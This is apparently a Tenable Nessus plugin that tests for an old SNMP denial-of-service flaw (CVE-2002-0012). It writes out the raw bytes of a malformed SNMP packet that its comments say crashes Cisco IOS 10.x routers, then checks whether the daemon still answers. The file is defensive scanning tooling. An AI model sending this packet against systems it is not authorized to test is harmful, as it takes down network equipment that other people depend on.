#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(10858);
  script_version("$Revision: 1.35 $");
  script_cvs_date("$Date: 2016/11/17 15:15:44 $");

  script_cve_id("CVE-2002-0012");
  script_bugtraq_id(4088);
  script_osvdb_id(810);
  script_xref(name:"CERT-CC", value:"CA-2002-03");

  script_name(english:"Multiple Vendor Malformed SNMP Trap Handling DoS");
  script_summary(english:"snmpd DoS");

  script_set_attribute(attribute:'synopsis', value:"The remote SNMP service is vulnerable to denial of service.");
  script_set_attribute(attribute:'description', value:
"It was possible to disable the remote SNMP daemon by sending a
malformed packet advertising bogus length fields.

An attacker may use this flaw to prevent you from using SNMP to
administer your network (or use other flaws to execute arbitrary code
with the privileges of the SNMP daemon).");
  script_set_attribute(attribute:'see_also', value:"http://seclists.org/bugtraq/2002/Aug/390");
  script_set_attribute(attribute:'solution', value:"Apply the latest SNMP patches from your vendor.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(264);

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/02/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/02/13");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
  script_family(english:"SNMP");

  script_dependencie("snmp_settings.nasl");
  script_require_keys("Settings/ParanoidReport", "SNMP/community");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);


#
# Crashes IOS 10.x and possibly others. The router reboots by itself
# in a few seconds.
#
# This is based on test case c06-snmpv1-req-enc-r1-1150 of
# the Protos Test Suite - see
# http://www.ee.oulu.fi/research/ouspg/protos/testing/c06/snmpv1/
# for details
#
#
#

community = get_kb_item("SNMP/community");
if(!community)exit(0);

port = get_kb_item("SNMP/port");
if(!port) port = 161;
if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");

function snmp_ping()
{
 local_var COMMUNITY_SIZE, SNMP_BASE, dstport, len, len_hi, len_lo;
 local_var result, sendata, soc, sz;

 SNMP_BASE = 31;
	COMMUNITY_SIZE = strlen(community);

	sz = COMMUNITY_SIZE % 256;


	len = SNMP_BASE + COMMUNITY_SIZE;
	len_hi = len / 256;
	len_lo = len % 256;
	sendata = raw_string(
		0x30, 0x82, len_hi, len_lo,
		0x02, 0x01, 0x00, 0x04,
		sz);


	sendata = sendata + community +
		raw_string( 0xA1,
		0x18, 0x02, 0x01, 0x01,
		0x02, 0x01, 0x00, 0x02,
		0x01, 0x00, 0x30, 0x0D,
		0x30, 0x82, 0x00, 0x09,
		0x06, 0x05, 0x2B, 0x06,
		0x01, 0x02, 0x01, 0x05,
		0x00);


	dstport = port;
	soc = open_sock_udp(dstport);
	send(socket:soc, data:sendata);
	result = recv(socket:soc, length:4096, timeout:3);
        close(soc);
	if(result)return(1);
	else return(0);

}


if(snmp_ping())
{
sz = strlen(community);
sz = sz % 256;


pkt = string(raw_string(0x30, 0x2b, 0x02, 0x01, 0x00, 0x04,
sz), community, raw_string( 0xa0, 0x1e, 0x02, 0x02, 0x04,
0x7e, 0x02, 0x01, 0x00,
0x02, 0x01, 0x00, 0x30, 0x12, 0x30, 0x10, 0x06,
0x84, 0x7F, 0xFF, 0xFF, 0xFF, 0x2B, 0x06, 0x01,
0x02, 0x1, 0x01, 0x05, 0x00, 0x05, 0x00));



soc = open_sock_udp(port);
send(socket:soc, data:pkt);
close(soc);
if(!snmp_ping())security_warning(port:port, protocol:"udp");
}
